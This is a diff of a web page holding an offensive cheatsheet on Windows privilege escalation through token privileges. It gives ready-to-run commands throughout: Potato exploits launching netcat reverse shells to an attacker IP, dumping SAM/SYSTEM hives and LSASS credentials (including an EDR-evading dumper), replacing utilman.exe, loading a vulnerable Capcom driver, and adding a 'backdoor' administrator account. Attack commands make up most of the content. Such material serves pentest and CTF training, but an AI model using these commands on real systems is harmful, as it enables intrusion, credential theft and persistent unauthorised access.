+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg>
+</button>
+<span class="search-trigger-shortcut desktop-only" aria-hidden=true>CTRL K</span></label><div id=search-dropdown class=search-dropdown hidden data-search-index-url=/search-index.json data-search-runtime-url=/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js><p class=search-status data-search-status aria-live=polite>Type to search posts and cheatsheets.</p><div class=search-results data-search-results role=listbox aria-label="Search results"><p class=search-empty>Type to search posts and cheatsheets.</p></div></div></div><button class="icon-button mobile-only" type=button data-search-mobile-toggle aria-label=Search aria-expanded=false aria-controls=search-root>
+<svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.35-3.35"/></svg>
+</button>
+<button class="icon-button mobile-only" type=button data-mobile-toggle aria-label="Toggle menu" aria-expanded=false aria-controls=mobile-nav>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon=""><path d="M3 6h18"/><path d="M3 12h18"/><path d="M3 18h18"/></svg>
+<svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon="" hidden=""><path d="M18 6 6 18"/><path d="M6 6l12 12"/></svg></button></div></div><div id=mobile-nav class=mobile-nav><a href=/>Posts</a>
+<a href=/posts/>Archive</a>
+<a href=/cheatsheets/ class=is-current>Cheatsheets</a>
+<a href=/about/>About</a></div></nav></header><main class=site-main><article class="container cheatsheet-docs-shell"><div class=cheatsheet-docs-layout><aside class=cheatsheet-sidebar aria-label="Windows Pentesting navigation"><div class=cheatsheet-sidebar-inner><a href=/cheatsheets/ class=cheatsheet-sidebar-root>All cheatsheets</a>
+<a href=/cheatsheets/windows/ class=cheatsheet-sidebar-section>Windows Pentesting</a><nav class=cheatsheet-sidebar-nav><ul class=cheatsheet-sidebar-list><li><a href=/cheatsheets/windows/00-windows-moc/ class=cheatsheet-sidebar-link>Windows MOC</a></li><li><a href=/cheatsheets/windows/w01-recon--enum/ class=cheatsheet-sidebar-link>Recon & Enum</a></li><li><a href=/cheatsheets/windows/w02-local-enum/ class=cheatsheet-sidebar-link>Local Enum</a></li><li><a href=/cheatsheets/windows/w03-privesc---tokens--privileges/ class="cheatsheet-sidebar-link is-current">PrivEsc - Tokens & Privileges</a></li><li><a href=/cheatsheets/windows/w04-privesc---services--registry/ class=cheatsheet-sidebar-link>PrivEsc - Services & Registry</a></li><li><a href=/cheatsheets/windows/w05-privesc---dll--unquoted-paths/ class=cheatsheet-sidebar-link>PrivEsc - DLL & Unquoted Paths</a></li><li><a href=/cheatsheets/windows/w06-privesc---credentials--files/ class=cheatsheet-sidebar-link>PrivEsc - Credentials & Files</a></li><li><a href=/cheatsheets/windows/w07-uac-bypass/ class=cheatsheet-sidebar-link>UAC Bypass</a></li><li><a href=/cheatsheets/windows/w08-privesc---kernel--exploits/ class=cheatsheet-sidebar-link>PrivEsc - Kernel & Exploits</a></li><li><a href=/cheatsheets/windows/w09-lolbas/ class=cheatsheet-sidebar-link>LOLBAS</a></li><li><a href=/cheatsheets/windows/w10-defender--amsi-evasion/ class=cheatsheet-sidebar-link>Defender & AMSI Evasion</a></li><li><a href=/cheatsheets/windows/w11-lateral-movement/ class=cheatsheet-sidebar-link>Lateral Movement</a></li></ul></nav></div></aside><div class="cheatsheet-docs-main cheatsheet-page-main"><header class=cheatsheet-page-header><h1>PrivEsc - Tokens & Privileges</h1></header><details class=cheatsheet-mobile-sections><summary class=cheatsheet-mobile-sections-summary><span class=cheatsheet-mobile-sections-label>Sections</span>
+<span class=cheatsheet-mobile-sections-current>PrivEsc - Tokens & Privileges</span>
+<span class=cheatsheet-mobile-sections-caret aria-hidden=true></span></summary><div class=cheatsheet-mobile-sections-panel><nav aria-label="Windows Pentesting sections"><ul class=cheatsheet-mobile-sections-list><li><a href=/cheatsheets/ class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a></li><li><a href=/cheatsheets/windows/ class=cheatsheet-mobile-sections-link>Overview</a></li><li><a href=/cheatsheets/windows/00-windows-moc/ class=cheatsheet-mobile-sections-link>Windows MOC</a></li><li><a href=/cheatsheets/windows/w01-recon--enum/ class=cheatsheet-mobile-sections-link>Recon & Enum</a></li><li><a href=/cheatsheets/windows/w02-local-enum/ class=cheatsheet-mobile-sections-link>Local Enum</a></li><li><a href=/cheatsheets/windows/w03-privesc---tokens--privileges/ class="cheatsheet-mobile-sections-link is-current">PrivEsc - Tokens & Privileges</a></li><li><a href=/cheatsheets/windows/w04-privesc---services--registry/ class=cheatsheet-mobile-sections-link>PrivEsc - Services & Registry</a></li><li><a href=/cheatsheets/windows/w05-privesc---dll--unquoted-paths/ class=cheatsheet-mobile-sections-link>PrivEsc - DLL & Unquoted Paths</a></li><li><a href=/cheatsheets/windows/w06-privesc---credentials--files/ class=cheatsheet-mobile-sections-link>PrivEsc - Credentials & Files</a></li><li><a href=/cheatsheets/windows/w07-uac-bypass/ class=cheatsheet-mobile-sections-link>UAC Bypass</a></li><li><a href=/cheatsheets/windows/w08-privesc---kernel--exploits/ class=cheatsheet-mobile-sections-link>PrivEsc - Kernel & Exploits</a></li><li><a href=/cheatsheets/windows/w09-lolbas/ class=cheatsheet-mobile-sections-link>LOLBAS</a></li><li><a href=/cheatsheets/windows/w10-defender--amsi-evasion/ class=cheatsheet-mobile-sections-link>Defender & AMSI Evasion</a></li><li><a href=/cheatsheets/windows/w11-lateral-movement/ class=cheatsheet-mobile-sections-link>Lateral Movement</a></li></ul></nav></div></details><div class="markdown-content cheatsheet-page-body"><p>Windows privileges = a list of specific powers attached to your token. One enabled privilege is often instant SYSTEM. Always start here after <a href=https://jinpwn.dev/cheatsheets/windows/w02-local-enum/>Local Enum</a>
+.</p><h2 id=i-the-privilege-table data-heading-permalink=true><span class=heading-content>i. The privilege table</span>
+<a class=heading-permalink href=#i-the-privilege-table aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>whoami /priv
+</span></span></code></pre></div><table><thead><tr><th>Privilege</th><th>What it gives</th><th>Path</th></tr></thead><tbody><tr><td>SeImpersonatePrivilege</td><td>Impersonate another token</td><td>Potato attack</td></tr><tr><td>SeAssignPrimaryTokenPrivilege</td><td>Assign primary token</td><td>Potato attack</td></tr><tr><td>SeBackupPrivilege</td><td>Read any file</td><td>Dump SAM/SYSTEM</td></tr><tr><td>SeRestorePrivilege</td><td>Write any file</td><td>Replace utilman or service binary</td></tr><tr><td>SeDebugPrivilege</td><td>Open any process</td><td>Dump LSASS</td></tr><tr><td>SeTakeOwnershipPrivilege</td><td>Take ownership of any file</td><td>Own then write</td></tr><tr><td>SeLoadDriverPrivilege</td><td>Load kernel drivers</td><td>Capcom driver trick</td></tr><tr><td>SeManageVolumePrivilege</td><td>Manage volumes</td><td>Indirect file write</td></tr><tr><td>SeTcbPrivilege</td><td>Act as part of OS</td><td>Already SYSTEM-equivalent</td></tr><tr><td>SeCreateTokenPrivilege</td><td>Create arbitrary tokens</td><td>Rare, direct SYSTEM</td></tr></tbody></table><p>Disabled privileges still count, you just need to enable them first (most tools handle this automatically).</p><h2 id=ii-seimpersonate--seassignprimarytoken-potato-attacks data-heading-permalink=true><span class=heading-content>ii. SeImpersonate / SeAssignPrimaryToken (Potato attacks)</span>
+<a class=heading-permalink href=#ii-seimpersonate--seassignprimarytoken-potato-attacks aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>The most common path. Service accounts (IIS, MSSQL, etc) have this by default. Pick the potato by the OS:</p><table><thead><tr><th>OS</th><th>Tool</th></tr></thead><tbody><tr><td>Win Server 2016/2019, Win 10 1809+</td><td><strong>PrintSpoofer</strong> or <strong>GodPotato</strong></td></tr><tr><td>Win Server 2022, Win 11</td><td><strong>GodPotato</strong> (PrintSpoofer patched)</td></tr><tr><td>Older Win 7/2008/2012</td><td><strong>JuicyPotato</strong> (DCOM CLSID method)</td></tr><tr><td>Anywhere modern</td><td><strong>RoguePotato</strong> (needs OXID resolver redirect)</td></tr></tbody></table><p>PrintSpoofer (preferred when it works):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\Windows\Temp\PrintSpoofer.exe</span><span class=c1> -i -c cmd.exe</span>
+</span></span><span class=line><span class=cl>## Or reverse:
+</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\Windows\Temp\PrintSpoofer.exe</span><span class=c1> -c &#34;C:\Windows\Temp\nc.exe 10.10.14.1 4444 -e cmd.exe&#34;</span>
+</span></span></code></pre></div><p>GodPotato (works on the newest patched boxes):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\Windows\Temp\GodPotato.exe</span><span class=c1> -cmd &#34;cmd /c whoami&#34;</span>
+</span></span><span class=line><span class=cl>C<span class=p>:</span><span class=nl>\Windows\Temp\GodPotato.exe</span><span class=c1> -cmd &#34;C:\Windows\Temp\nc.exe 10.10.14.1 4444 -e cmd.exe&#34;</span>
+</span></span></code></pre></div><p>JuicyPotato (legacy):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>JuicyPotato.exe -t * -l 1337 -p C:\Windows\Temp\nc.exe -a <span class=s2>&#34;10.10.14.1 4444 -e cmd.exe&#34;</span> -c <span class=s2>&#34;{CLSID}&#34;</span>
+</span></span><span class=line><span class=cl>## Find a working CLSID from https://ohpe.it/juicy-potato/CLSID/
+</span></span></code></pre></div><p>RoguePotato (when JuicyPotato fails on 2019+):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>## On attacker, run a relay on port 135:
+</span></span><span class=line><span class=cl>socat tcp-listen:135,reuseaddr,fork tcp:10.10.11.50:9999
+</span></span><span class=line><span class=cl>## On target:
+</span></span><span class=line><span class=cl>RoguePotato.exe -r 10.10.14.1 -l 9999 -e <span class=s2>&#34;C:\Windows\Temp\nc.exe 10.10.14.1 4444 -e cmd.exe&#34;</span>
+</span></span></code></pre></div><div class="obsidian-callout callout-tip"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8.5 14.5A2.5 2.5.0 0011 12c0-1.38-.5-2-1-3-1.072-2.143-.224-4.054 2-6 .5 2.5 2 4.9 4 6.5s3 3.5 3 5.5A7 7 0 115 15c0-1.153.433-2.294 1-3a2.5 2.5.0 002.5 2.5z"/></svg></div><span class=obsidian-callout-title>Try in order</span></div><div class=obsidian-callout-body><p>PrintSpoofer first, GodPotato if it fails, RoguePotato as a fallback. JuicyPotato only on legacy boxes (2008-2016). One of them almost always works when SeImpersonate is enabled.</p></div></div><h2 id=iii-sebackupprivilege data-heading-permalink=true><span class=heading-content>iii. SeBackupPrivilege</span>
+<a class=heading-permalink href=#iii-sebackupprivilege aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Read any file, even when DACL denies it. Get to SAM and SYSTEM hives, dump them offline:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c>## Copy SAM + SYSTEM with reg save (needs Backup priv, not admin)</span>
+</span></span><span class=line><span class=cl><span class=n>reg</span> <span class=n>save</span> <span class=n>HKLM</span><span class=p>\</span><span class=n>SAM</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>SAM</span>
+</span></span><span class=line><span class=cl><span class=n>reg</span> <span class=n>save</span> <span class=n>HKLM</span><span class=p>\</span><span class=n>SYSTEM</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>SYSTEM</span>
+</span></span><span class=line><span class=cl><span class=n>reg</span> <span class=n>save</span> <span class=n>HKLM</span><span class=p>\</span><span class=n>SECURITY</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>SECURITY</span>
+</span></span><span class=line><span class=cl><span class=c>## Download to attacker, then:</span>
+</span></span><span class=line><span class=cl><span class=nb>impacket-secretsdump</span> <span class=n>-sam</span> <span class=n>SAM</span> <span class=n>-system</span> <span class=n>SYSTEM</span> <span class=n>-security</span> <span class=n>SECURITY</span> <span class=n>LOCAL</span>
+</span></span></code></pre></div><p>When <code>reg save</code> is blocked, use <code>robocopy</code> with backup mode:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>robocopy /B C:\Windows\System32\config\ C:\Windows\Temp\ SAM SYSTEM SECURITY
+</span></span></code></pre></div><p>Then pass the hash to Administrator, see <a href=https://jinpwn.dev/cheatsheets/windows/w11-lateral-movement/>Lateral Movement</a>
+.</p><h2 id=iv-serestoreprivilege data-heading-permalink=true><span class=heading-content>iv. SeRestorePrivilege</span>
+<a class=heading-permalink href=#iv-serestoreprivilege aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Write any file. Two classic abuse paths:</p><p>Replace <code>utilman.exe</code> (the accessibility tool on the lock screen) with cmd, then trigger from lockscreen Win+U:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>takeown /f C:\Windows\System32\utilman.exe
+</span></span><span class=line><span class=cl><span class=k>copy</span> C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+</span></span><span class=line><span class=cl>## Lock the screen, press Win+U -<span class=p>&gt;</span> SYSTEM cmd
+</span></span></code></pre></div><p>Or overwrite a service binary you can&rsquo;t normally write to, then restart the service (need restart rights, common with SeServiceLogon or admin on a service).</p><h2 id=v-sedebugprivilege data-heading-permalink=true><span class=heading-content>v. SeDebugPrivilege</span>
+<a class=heading-permalink href=#v-sedebugprivilege aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Open any process, including LSASS. Pull all logged-in user creds:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c>## Native procdump (signed Microsoft binary, often allowed)</span>
+</span></span><span class=line><span class=cl><span class=n>procdump</span><span class=p>.</span><span class=py>exe</span> <span class=n>-accepteula</span> <span class=n>-ma</span> <span class=n>lsass</span><span class=p>.</span><span class=py>exe</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>lsass</span><span class=p>.</span><span class=py>dmp</span>
+</span></span><span class=line><span class=cl><span class=c>## Then on attacker:</span>
+</span></span><span class=line><span class=cl><span class=nb>impacket-pypykatz</span> <span class=n>lsa</span> <span class=n>minidump</span> <span class=n>lsass</span><span class=p>.</span><span class=py>dmp</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c>## Native task manager dump if procdump isn&#39;t there</span>
+</span></span><span class=line><span class=cl><span class=c>## (Task Manager -&gt; Details -&gt; right click lsass -&gt; Create dump file)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c>## Nanodump (designed to evade EDR)</span>
+</span></span><span class=line><span class=cl><span class=n>nanodump</span><span class=p>.</span><span class=py>exe</span> <span class=p>-</span><span class=n>-write</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>lsass</span><span class=p>.</span><span class=py>dmp</span>
+</span></span></code></pre></div><p>Or attach with a debugger and run shellcode:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c>## Open a SYSTEM process and inject</span>
+</span></span><span class=line><span class=cl><span class=c>## Frameworks: pyrasite (Python), PowerSploit Invoke-DllInjection</span>
+</span></span></code></pre></div><h2 id=vi-setakeownershipprivilege data-heading-permalink=true><span class=heading-content>vi. SeTakeOwnershipPrivilege</span>
+<a class=heading-permalink href=#vi-setakeownershipprivilege aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Take ownership of any object, then change DACL to allow yourself write access:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>takeown /f C:\Windows\System32\config\SAM
+</span></span><span class=line><span class=cl>icacls C:\Windows\System32\config\SAM /grant <span class=nv>%USERNAME%</span>:F
+</span></span><span class=line><span class=cl><span class=k>copy</span> C:\Windows\System32\config\SAM C:\Windows\Temp\SAM
+</span></span></code></pre></div><p>Combine with SeRestore to skip the icacls step (you have write right via the privilege).</p><h2 id=vii-seloaddriverprivilege data-heading-permalink=true><span class=heading-content>vii. SeLoadDriverPrivilege</span>
+<a class=heading-permalink href=#vii-seloaddriverprivilege aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Load a kernel driver. Use a known vulnerable signed driver to gain kernel exec:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=c>## Capcom.sys is the classic (signed by Capcom, vulnerable, lets you exec ring0 code)</span>
+</span></span><span class=line><span class=cl><span class=c>## Public PoC: https://github.com/TarlogicSecurity/EoPLoadDriver</span>
+</span></span><span class=line><span class=cl><span class=n>EoPLoadDriver</span><span class=p>.</span><span class=py>exe</span> <span class=n>System</span><span class=p>\</span><span class=n>CurrentControlSet</span><span class=p>\</span><span class=n>MyService</span> <span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>Temp</span><span class=p>\</span><span class=n>capcom</span><span class=p>.</span><span class=py>sys</span>
+</span></span><span class=line><span class=cl><span class=c>## Then exploit via ExploitCapcom.exe to spawn SYSTEM</span>
+</span></span></code></pre></div><p>Most modern Win blocks unsigned drivers and revokes Capcom&rsquo;s signature. Try only on older boxes.</p><h2 id=viii-semanagevolumeprivilege data-heading-permalink=true><span class=heading-content>viii. SeManageVolumePrivilege</span>
+<a class=heading-permalink href=#viii-semanagevolumeprivilege aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Modest privilege that leads to file access. Use SeManageVolumeExploit:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>SeManageVolumeExploit.exe
+</span></span><span class=line><span class=cl>## Grants you NTFS rights to C:\, then you can read/write anything
+</span></span></code></pre></div><h2 id=ix-secreatetoken--setcb data-heading-permalink=true><span class=heading-content>ix. SeCreateToken + SeTcb</span>
+<a class=heading-permalink href=#ix-secreatetoken--setcb aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>If you have these, you are effectively SYSTEM already. Create your own token with any SIDs:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>## Rare, but if you have SeCreateToken, NoPac-style abuse
+</span></span><span class=line><span class=cl>## Direct token creation -<span class=p>&gt;</span> impersonate -<span class=p>&gt;</span> SYSTEM
+</span></span></code></pre></div><h2 id=x-quick-whoami-priv---action-table data-heading-permalink=true><span class=heading-content>x. Quick whoami /priv -> action table</span>
+<a class=heading-permalink href=#x-quick-whoami-priv---action-table aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>When you see this, do this:</p><pre tabindex=0><code>SeImpersonatePrivilege            Enabled   -&gt; PrintSpoofer / GodPotato
 SeAssignPrimaryTokenPrivilege     Enabled   -&gt; PrintSpoofer / GodPotato
 SeBackupPrivilege                 Enabled   -&gt; reg save SAM,SYSTEM,SECURITY
 SeRestorePrivilege                Enabled   -&gt; overwrite utilman.exe
@@ -490,95 +83,14 @@ SeTakeOwnershipPrivilege          Enabled   -&gt; takeown + icacls on SAM
 SeLoadDriverPrivilege             Enabled   -&gt; capcom driver (legacy only)
 SeManageVolumePrivilege           Enabled   -&gt; SeManageVolumeExploit
 SeTcbPrivilege                    Enabled   -&gt; already SYSTEM-equivalent
-</code></pre><h2 id="xi-service-account-default-privileges" data-heading-permalink="true"><span class="heading-content">xi. Service account default privileges</span>
-    <a class="heading-permalink" href="#xi-service-account-default-privileges" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Many footholds land you as a service account. Default privilege sets:</p>
-<table>
-  <thead>
-      <tr>
-          <th>Account</th>
-          <th>Has SeImpersonate?</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td>IIS APPPOOL*</td>
-          <td>Yes</td>
-      </tr>
-      <tr>
-          <td>NT SERVICE\MSSQL$*</td>
-          <td>Yes</td>
-      </tr>
-      <tr>
-          <td>NT AUTHORITY\NETWORK SERVICE</td>
-          <td>Yes</td>
-      </tr>
-      <tr>
-          <td>NT AUTHORITY\LOCAL SERVICE</td>
-          <td>Yes</td>
-      </tr>
-      <tr>
-          <td>Regular domain users</td>
-          <td>No</td>
-      </tr>
-  </tbody>
-</table>
-<p>If you landed via IIS/SQL/network service, jump straight to Potato.</p>
-<h2 id="xii-after-system-persist" data-heading-permalink="true"><span class="heading-content">xii. After SYSTEM, persist</span>
-    <a class="heading-permalink" href="#xii-after-system-persist" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Drop a callback (see <a href="https://jinpwn.dev/cheatsheets/windows/w10-defender--amsi-evasion/">Defender &amp; AMSI Evasion</a>
- when written) or add a local admin:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">net user backdoor &#39;Passw0rd!&#39; /add
-</span></span><span class="line"><span class="cl">net localgroup Administrators backdoor /add
-</span></span></code></pre></div><p>Document everything you did for <a href="https://jinpwn.dev/cheatsheets/linux-pentesting/13-persistence--cleanup/">Persistence &amp; Cleanup</a>
-.</p>
-
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/windows/w02-local-enum/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">Local Enum</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/windows/w04-privesc---services--registry/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">PrivEsc - Services &amp; Registry</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
-</footer>
-
-</body>
-</html>
+</code></pre><h2 id=xi-service-account-default-privileges data-heading-permalink=true><span class=heading-content>xi. Service account default privileges</span>
+<a class=heading-permalink href=#xi-service-account-default-privileges aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Many footholds land you as a service account. Default privilege sets:</p><table><thead><tr><th>Account</th><th>Has SeImpersonate?</th></tr></thead><tbody><tr><td>IIS APPPOOL*</td><td>Yes</td></tr><tr><td>NT SERVICE\MSSQL$*</td><td>Yes</td></tr><tr><td>NT AUTHORITY\NETWORK SERVICE</td><td>Yes</td></tr><tr><td>NT AUTHORITY\LOCAL SERVICE</td><td>Yes</td></tr><tr><td>Regular domain users</td><td>No</td></tr></tbody></table><p>If you landed via IIS/SQL/network service, jump straight to Potato.</p><h2 id=xii-after-system-persist data-heading-permalink=true><span class=heading-content>xii. After SYSTEM, persist</span>
+<a class=heading-permalink href=#xii-after-system-persist aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Drop a callback (see <a href=https://jinpwn.dev/cheatsheets/windows/w10-defender--amsi-evasion/>Defender & AMSI Evasion</a>
+when written) or add a local admin:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>net user backdoor &#39;Passw0rd!&#39; /add
+</span></span><span class=line><span class=cl>net localgroup Administrators backdoor /add
+</span></span></code></pre></div><p>Document everything you did for <a href=https://jinpwn.dev/cheatsheets/linux-pentesting/13-persistence--cleanup/>Persistence & Cleanup</a>
+.</p></div><nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href=/cheatsheets/windows/w02-local-enum/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Previous</span>
+<span class=cheatsheet-pager-title>Local Enum</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+</span></a><a class="cheatsheet-pager-link is-next" href=/cheatsheets/windows/w04-privesc---services--registry/><div class=cheatsheet-pager-copy><span class=cheatsheet-pager-label>Next</span>
+<span class=cheatsheet-pager-title>PrivEsc - Services & Registry</span></div><span class=cheatsheet-pager-arrow aria-hidden=true><svg width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg></span></a></nav></div></div></article></main><button class=scroll-top-button type=button data-scroll-top aria-label="Scroll to top" aria-hidden=true tabindex=-1>
+<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 18V6"/><path d="M6.75 11.25 12 6l5.25 5.25"/></svg></button><footer class=site-footer><p>&copy; 2026 JinPwn</p></footer></body></html>
